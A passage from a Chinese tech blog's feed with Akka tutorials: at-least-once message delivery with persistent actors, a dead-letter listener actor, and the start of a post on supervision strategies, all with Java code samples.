我们首先来看看本例中用到的消息体MsgSent、Msg、Confirm及MsgConfirmed。MsgSent代表将要发送的消息，但是只用于持久化，持久化完成后会将MsgSent转换为Msg进行发送。也就是说Msg才会被真正用于消息发送。接收者收到Msg消息后将向发送者回复Confirm消息，需要注意的是Msg和Confirm都有属性deliveryId，此deliveryId由发送者的持久化功能生成，一条Msg消息和其对应的Confirm回复的deliveryId必须一致，否则在利用UntypedPersistentActorWithAtLeastOnceDelivery对回复消息进行确认时会产生严重的bug。发送者收到接收者的Confirm回复后首先将其转换为MsgConfirmed，然后对MsgConfirmed进行持久化，最后调用UntypedPersistentActorWithAtLeastOnceDelivery提供的confirmDelivery方法对回复进行确认。MsgSent、Msg、Confirm及MsgConfirmed的代码实现如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public interface Persistence &#123;</span><br><span class="line"> </span><br><span class="line">public static class Msg implements Serializable &#123;</span><br><span class="line">private static final long serialVersionUID = 1L;</span><br><span class="line">public final long deliveryId;</span><br><span class="line">public final String s;</span><br><span class="line"> </span><br><span class="line">public Msg(long deliveryId, String s) &#123;</span><br><span class="line">this.deliveryId = deliveryId;</span><br><span class="line">this.s = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">public static class Confirm implements Serializable &#123;</span><br><span class="line">private static final long serialVersionUID = 1L;</span><br><span class="line">public final long deliveryId;</span><br><span class="line"> </span><br><span class="line">public Confirm(long deliveryId) &#123;</span><br><span class="line">this.deliveryId = deliveryId;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">public static class MsgSent implements Serializable &#123;</span><br><span class="line">private static final long serialVersionUID = 1L;</span><br><span class="line">public final String s;</span><br><span class="line"> </span><br><span class="line">public MsgSent(String s) &#123;</span><br><span class="line">this.s = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">public static class MsgConfirmed implements Serializable &#123;</span><br><span class="line">private static final long serialVersionUID = 1L;</span><br><span class="line">public final long deliveryId;</span><br><span class="line"> </span><br><span class="line">public MsgConfirmed(long deliveryId) &#123;</span><br><span class="line">this.deliveryId = deliveryId;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-服务端"><a href="#4-1-服务端" class="headerlink" title="4.1.服务端"></a>4.1.服务端</h3><p>本例中的服务端非常简单，是一个接收处理Msg消息，并向发送者回复Confirm消息的Actor，代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@Named(&quot;MyDestination&quot;)</span><br><span class="line">@Scope(&quot;prototype&quot;)</span><br><span class="line">public class MyDestination extends UntypedActor &#123;</span><br><span class="line"></span><br><span class="line">LoggingAdapter log = Logging.getLogger(getContext().system(), this);</span><br><span class="line"></span><br><span class="line">public void onReceive(Object message) throws Exception &#123;</span><br><span class="line">if (message instanceof Msg) &#123;</span><br><span class="line">Msg msg = (Msg) message;</span><br><span class="line">log.info(&quot;receive msg : &quot; + msg.s + &quot;, deliveryId : &quot; + msg.deliveryId);</span><br><span class="line">getSender().tell(new Confirm(msg.deliveryId), getSelf());</span><br><span class="line">&#125; else &#123;</span><br><span class="line">unhandled(message);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端的启动代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logger.info(&quot;Start myDestination&quot;);</span><br><span class="line">final ActorRef myDestination = actorSystem.actorOf(springExt.props(&quot;MyDestination&quot;), &quot;myDestination&quot;);</span><br><span class="line">logger.info(&quot;Started myDestination&quot;);</span><br></pre></td></tr></table></figure><h3 id="4-2-客户端"><a href="#4-2-客户端" class="headerlink" title="4.2.客户端"></a>4.2.客户端</h3><p>具体介绍客户端之前，先来列出其实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">@Named(&quot;MyPersistentActor&quot;)</span><br><span class="line">@Scope(&quot;prototype&quot;)</span><br><span class="line">public class MyPersistentActor extends UntypedPersistentActorWithAtLeastOnceDelivery &#123;</span><br><span class="line"></span><br><span class="line">LoggingAdapter log = Logging.getLogger(getContext().system(), this);</span><br><span class="line"></span><br><span class="line">private final ActorSelection destination;</span><br><span class="line"> </span><br><span class="line">@Override</span><br><span class="line">public String persistenceId() &#123;</span><br><span class="line">return &quot;persistence-id&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">public MyPersistentActor(ActorSelection destination) &#123;</span><br><span class="line">this.destination = destination;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@Override</span><br><span class="line">public void onReceiveCommand(Object message) &#123;</span><br><span class="line">if (message instanceof String) &#123;</span><br><span class="line">String s = (String) message;</span><br><span class="line">log.info(&quot;receive msg : &quot; + s);</span><br><span class="line">persist(new MsgSent(s), new Procedure&lt;MsgSent&gt;() &#123;</span><br><span class="line">public void apply(MsgSent evt) &#123;</span><br><span class="line">updateState(evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; else if (message instanceof Confirm) &#123;</span><br><span class="line">Confirm confirm = (Confirm) message;</span><br><span class="line">log.info(&quot;receive confirm with deliveryId : &quot; + confirm.deliveryId);</span><br><span class="line">persist(new MsgConfirmed(confirm.deliveryId), new Procedure&lt;MsgConfirmed&gt;() &#123;</span><br><span class="line">public void apply(MsgConfirmed evt) &#123;</span><br><span class="line">updateState(evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; else if (message instanceof UnconfirmedWarning) &#123;</span><br><span class="line">log.info(&quot;receive unconfirmed warning : &quot; + message);</span><br><span class="line">// After a number of delivery attempts a AtLeastOnceDelivery.UnconfirmedWarning message will be sent to self. The re-sending will still continue, but you can choose to call confirmDelivery to cancel the re-sending. </span><br><span class="line">List&lt;UnconfirmedDelivery&gt; list = ((UnconfirmedWarning) message).getUnconfirmedDeliveries();</span><br><span class="line">for (UnconfirmedDelivery unconfirmedDelivery : list) &#123;</span><br><span class="line">Msg msg = (Msg) unconfirmedDelivery.getMessage();</span><br><span class="line">confirmDelivery(msg.deliveryId);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">unhandled(message);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@Override</span><br><span class="line">public void onReceiveRecover(Object event) &#123;</span><br><span class="line">updateState(event);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void updateState(Object event) &#123;</span><br><span class="line">if (event instanceof MsgSent) &#123;</span><br><span class="line">final MsgSent evt = (MsgSent) event;</span><br><span class="line">deliver(destination, new Function&lt;Long, Object&gt;() &#123;</span><br><span class="line">public Object apply(Long deliveryId) &#123;</span><br><span class="line">return new Msg(deliveryId, evt.s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; else if (event instanceof MsgConfirmed) &#123;</span><br><span class="line">final MsgConfirmed evt = (MsgConfirmed) event;</span><br><span class="line">confirmDelivery(evt.deliveryId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正如我们之前所述——要使用at-least-once的能力，就必须继承UntypedPersistentActorWithAtLeastOnceDelivery。有关MsgSent、Msg、Confirm及MsgConfirmed等消息的处理过程已经介绍过，这里不再赘述。我们注意到onReceiveCommand方法还处理了一种名为UnconfirmedWarning的消息，这类消息将在at-least-once机制下进行无限或者一定数量的投递尝试后发送给当前Actor，这里的数量可以通过在at-least-once-delivery配置中增加配置项warn-after-number-of-unconfirmed-attempts来调整，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">at-least-once-delivery &#123;</span><br><span class="line">  redeliver-interval = 20000</span><br><span class="line">  redelivery-burst-limit = 100</span><br><span class="line">  warn-after-number-of-unconfirmed-attempts = 6</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当你收到UnconfirmedWarning的消息时，说明已经超出了你期望的最大重试次数，此时可以做一些控制了，例如：对于这些消息发送报警、丢弃等。本例中选择了丢弃。<br>​</p><p>UntypedPersistentActorWithAtLeastOnceDelivery的状态由那些尚未被确认的消息和一个序列号组成。UntypedPersistentActorWithAtLeastOnceDelivery本身不会存储这些状态，依然需要你在调用deliver方法投递消息之前，调用persist方法持久化这些事件或消息，以便于当持久化Actor能够在恢复阶段恢复。在恢复阶段，deliver方法并不会将发出消息，此时持久化Actor一面恢复，一面只能等待接收回复。当恢复完成，deliver将发送那些被缓存的消息（除了收到回复，并调用confirmDelivery方法的消息）。</p><h3 id="4-3-运行例子"><a href="#4-3-运行例子" class="headerlink" title="4.3.运行例子"></a>4.3.运行例子</h3><p>本文将率先启动客户端并向服务端发送hello-1，hello-2，hello-3这三消息，但是由于服务端此时并未启动，所以客户端会不断重试，直到重试达到上限或者受到回复并确认。服务端发送消息的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">logger.info(&quot;Start myPersistentActor&quot;);</span><br><span class="line">final String path = &quot;akka.tcp://metadataAkkaSystem@127.0.0.1:2551/user/myDestination&quot;;</span><br><span class="line">final ActorSelection destination = actorSystem.actorSelection(path);</span><br><span class="line">final ActorRef myPersistentActor = actorSystem.actorOf(springExt.props(&quot;MyPersistentActor&quot;, destination), &quot;myPersistentActor&quot;);</span><br><span class="line">actorMap.put(&quot;myPersistentActor&quot;, myPersistentActor);</span><br><span class="line">logger.info(&quot;Started myPersistentActor&quot;);</span><br><span class="line">myPersistentActor.tell(&quot;hello-1&quot;, null);</span><br><span class="line">myPersistentActor.tell(&quot;hello-2&quot;, null);</span><br><span class="line">myPersistentActor.tell(&quot;hello-3&quot;, null);</span><br></pre></td></tr></table></figure><p>客户端发送三条消息后，日志中立马打印出了以下内容：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1638194881274-1090ae0e-f718-4fe7-a8cb-ad75517df01d.png#clientId=ue70c9369-308a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=39&id=u3b7e7e90&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19614&status=done&style=none&taskId=ua51cf7ee-a6c2-4f6b-bccc-9a3501e200c&title=&width=275" alt="image.png"><br>但是一直未受到回复信息，然后我们启动服务端，不一会就看到了以下日志输出：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1638194890814-0fbb271f-c805-4aeb-ad6e-ea273e911cf1.png#clientId=ue70c9369-308a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=24&id=u6a72b8d4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=47&originWidth=632&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14867&status=done&style=none&taskId=u00ac55c8-ef21-4ed2-9762-df9011bbf7e&title=&width=316" alt="image.png"><br>我们再来看看客户端，发现已经收到了回复，内容如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1638194898363-0b3dbc2e-6a80-416f-935c-9eb838483a5d.png#clientId=ue70c9369-308a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=32&id=ufbd72f03&margin=%5Bobject%20Object%5D&name=image.png&originHeight=63&originWidth=631&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19173&status=done&style=none&taskId=u48fb0c4c-13df-4868-b07e-969da1367c6&title=&width=315.5" alt="image.png"></p><h3 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4.总结"></a>4.4.总结</h3><p>通过使用UntypedPersistentActorWithAtLeastOnceDelivery提供的persist、deliver及confirmDelivery等方法可以对整个应用的at-least-once需求，轻松实现在框架层面上一致的实现。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>​<a href="https://blog.csdn.net/beliefer/article/details/53929751">https://blog.csdn.net/beliefer/article/details/53929751</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1.概述&quot;&gt;&lt;/a&gt;1.概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;  在《使用Akka持久化——持久化与快照》一文中介绍了如何使用Akka持久化消息及生成快照。对于集群应用来</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-DeadLetter监听</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-DeadLetter%E7%9B%91%E5%90%AC/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-DeadLetter%E7%9B%91%E5%90%AC/</id>
    <published>2021-12-03T08:22:48.138Z</published>
    <updated>2021-12-03T09:07:15.168Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-自定义监听actor"><a href="#1-自定义监听actor" class="headerlink" title="1.自定义监听actor"></a>1.自定义监听actor</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> akka.actor.UntypedActor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.concurrent.BasicThreadFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ScheduledExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ScheduledThreadPoolExecutor;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> wuhao</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@createTime</span> 2021-09-26 17:06:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeadLetterActor</span> <span class="keyword">extends</span> <span class="title">UntypedActor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> CLEAN_TIME = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> MAX_DEAD_LETTER = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Object&gt; deadLetterList = Collections.synchronizedList(<span class="keyword">new</span> ArrayList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ScheduledExecutorService scheduledExecutorService =  <span class="keyword">new</span> ScheduledThreadPoolExecutor(<span class="number">1</span>,</span><br><span class="line">            <span class="keyword">new</span> BasicThreadFactory.Builder().namingPattern(<span class="string">&quot;dead-letter-schedule-pool-%d&quot;</span>).daemon(<span class="keyword">true</span>).build());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                deadLetterList.clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, CLEAN_TIME, CLEAN_TIME, TimeUnit.MINUTES);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Object message)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        addDeadLetter(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addDeadLetter</span><span class="params">(Object message)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (deadLetterList.size() &lt; MAX_DEAD_LETTER) &#123;</span><br><span class="line">            deadLetterList.add(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Object&gt; <span class="title">getDeadLetter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> deadLetterList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-监听actor"><a href="#2-监听actor" class="headerlink" title="2.监听actor"></a>2.监听actor</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ActorRef deadLetterRef = akka.actorOf(Props.create(DeadLetterActor.class), <span class="string">&quot;remoting-profiler-deadletter&quot;</span>);</span><br><span class="line">akka.eventStream().subscribe(deadLetterRef, DeadLetter.class);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-自定义监听actor&quot;&gt;&lt;a href=&quot;#1-自定义监听actor&quot; class=&quot;headerlink&quot; title=&quot;1.自定义监听actor&quot;&gt;&lt;/a&gt;1.自定义监听actor&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;t</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-监管与容错</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%9B%91%E7%AE%A1%E4%B8%8E%E5%AE%B9%E9%94%99/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%9B%91%E7%AE%A1%E4%B8%8E%E5%AE%B9%E9%94%99/</id>
    <published>2021-12-03T08:22:40.247Z</published>
    <updated>2021-12-03T09:07:15.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code> Akka作为一种成熟的生产环境并发解决方案，必须拥有一套完善的错误异常处理机制，本文主要讲讲Akka中的监管和容错。</code></pre><h2 id="2-监管"><a href="#2-监管" class="headerlink" title="2.监管"></a>2.监管</h2><pre><code>  Akka中的Actor系统它的很重要的概念就是分而治之，既然我们把任务分配给Actor去执行，那么我们必须去监管相应的Actor，当Actor出现了失败，比如系统环境错误，各种异常，能根据我们制定的相应监管策略进行错误恢复，就是后面我们会说到的容错。</code></pre><h3 id="2-1-监管者"><a href="#2-1-监管者" class="headerlink" title="2.1 监管者"></a>2.1 监管者</h3><pre><code>既然有监管这一事件，那必然存在着**监管者**这么一个角色，那么在ActorSystem中是如何确定这种角色的呢？我们先来看下ActorSystem中的顶级监管者：</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632279269265-ec086cfc-9273-4eb5-a3a7-f14efdce9d6d.png#clientId=u78e747ea-013b-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=753&id=u6be28fc7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=753&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58348&status=done&style=none&taskId=ueb676476-a220-4713-a637-1077136adac&title=&width=833" alt="image.png"><br>    一个actor系统在其创建过程中至少要<strong>启动三个actor</strong>，如上图所示，下面来说说这三个Actor的功能：</p><h4 id="2-1-1-根监管者"><a href="#2-1-1-根监管者" class="headerlink" title="2.1.1. 根监管者 /:"></a>2.1.1. 根监管者 /:</h4><pre><code>顾名思义，它是一个老大，它监管着ActorSystem中所有的顶级Actor，顶级Actor有以下几种：</code></pre><ul><li><p>/user： 是所有由用户创建的顶级actor的监管者；用ActorSystem.actorOf创建的actor在其下。</p></li><li><p>/system： 是所有由系统创建的顶级actor的监管者，如日志监听器，或由配置指定在actor系统启动时自动部署的actor。</p></li><li><p>/deadLetters： 是死信actor，所有发往已经终止或不存在的actor的消息会被重定向到这里。</p></li><li><p>/temp：是所有系统创建的短时actor的监管者，例如那些在ActorRef.ask的实现中用到的actor。</p></li><li><p>/remote： 是一个人造虚拟路径，用来存放所有其监管者是远程actor引用的actor。</p><p>   跟我们平常打交道最多的就是/user，它是我们在程序中用ActorSystem.actorOf创建的actor的监管者，下面的容错我们重点关心的就是它下面的失败处理，其他几种顶级Actor具体功能定义已经给出，有兴趣的也可以去了解一下。<br>   根监管者监管着所有顶级Actor，对它们的各种失败情况进行处理，一般来说如果错误要上升到根监管者，整个系统就会停止。</p><h4 id="2-1-2-顶级actor监管者-user："><a href="#2-1-2-顶级actor监管者-user：" class="headerlink" title="2.1.2. 顶级actor监管者 /user："></a>2.1.2. 顶级actor监管者 /user：</h4><p>  上面已经讲过/user是所有由用户创建的顶级actor的监管者，即用ActorSystem.actorOf创建的actor，我们可以自己制定相应的监管策略，但由于它是actor系统启动时就产生的，所以我们需要在相应的配置文件里配置，具体的配置可以参考这里<a href="http://doc.akka.io/docs/akka/current/general/configuration.html">Akka配置</a><br>​</p></li></ul><h4 id="2-1-3-系统监管者-system："><a href="#2-1-3-系统监管者-system：" class="headerlink" title="2.1.3. 系统监管者 /system："></a>2.1.3. 系统监管者 /system：</h4><pre><code>/system所有由系统创建的顶级actor的监管者,比如Akka中的日志监听器，因为在Akka中日志本身也是用Actor实现的，/system的监管策略如下：对收到的除ActorInitializationException和ActorKilledException之外的所有Exception无限地执行重启，当然这也会终止其所有子actor。所有其他Throwable被上升到根监管者，然后整个actor系统将会关闭。用户创建的普通actor的监管：上一篇文章介绍了Actor系统的组织结构，它是一种树形结构，其实这种结构对actor的监管是非常有利的，Akka实现的是一种叫“父监管”的形式，每一个被创建的actor都由其父亲所监管，这种限制使得actor的监管结构隐式符合其树形结构，所以我们可以得出一个结论：</code></pre><p>  **  一个被创建的Actor肯定是一个被监管者，也可能是一个监管者，它监管着它的子级Actor**<br><strong>​</strong></p><h3 id="2-2-监管策略"><a href="#2-2-监管策略" class="headerlink" title="2.2 监管策略"></a>2.2 监管策略</h3><pre><code>  在Akka框架内，父Actor对子Actor进行监督，监控子Actor的行为是否有异常。大体上，监控策略分为两种:</code></pre><ul><li><p>OneForOneStrategy策略：父Actor只会对出问题的子Actor进行处理。比如重启或停止。Akka的默认策略，推荐使用。</p></li><li><p>AllForOneStrategy策略：父Actor会对出问题的子Actor以及它所有的兄弟节点都进行处理。只适用于各个Actor联系非常紧密的场景，如果多个Actor只要有一个失败，则宣布整个任务失败的情况。</p></li><li><p>Actor中具体的处理方式主要包括以下：</p><ul><li><p>继续（resume） ：Actor 继续处理下一条消息；</p></li><li><p>停止（stop） ：停 止 Actor，不再做任何操作；</p></li><li><p>重启（restart） ：新建一个 Actor，代替原来的 Actor；</p></li><li><p>向上反映（escalate） ：将异常信息传递给下一个监督者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class JavaSupervisorStrategyDemo extends AbstractActor &#123;</span><br><span class="line">    private static SupervisorStrategy strategy =</span><br><span class="line">            new OneForOneStrategy(</span><br><span class="line">                    10,</span><br><span class="line">                    Duration.create(&quot;1 minute&quot;),</span><br><span class="line">                    /*</span><br><span class="line">                     * resume(): Actor 继续处理下一条消息;</span><br><span class="line">                     * restart():  停 止Actor，不再做任何操作;</span><br><span class="line">                     * escalate(): 新建一个 Actor，代替原来的 Actor;</span><br><span class="line">                     * stop(): 将异常信息传递给下一个监督者;</span><br><span class="line">                     */</span><br><span class="line">                    DeciderBuilder.match(ArithmeticException.class, e -&gt; SupervisorStrategy.resume())</span><br><span class="line">                            .match(NullPointerException.class, e -&gt; SupervisorStrategy.restart())</span><br><span class="line">                            .match(IllegalArgumentException.class, e -&gt; SupervisorStrategy.stop())</span><br><span class="line">                            .matchAny(o -&gt; SupervisorStrategy.escalate())</span><br><span class="line">                            .build());</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public SupervisorStrategy supervisorStrategy() &#123;</span><br><span class="line">        return strategy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 一对一策略（one-for-one strategy）意味着每个子级都被单独对待。在上面的示例中，10和Duration.create(1, TimeUnit.MINUTES)分别传递给maxNrOfRetries和withinTimeRange参数，这意味着策略每分钟重新启动一个子级最多10次。如果在withinTimeRange持续时间内重新启动计数超过maxNrOfRetries，则子 Actor 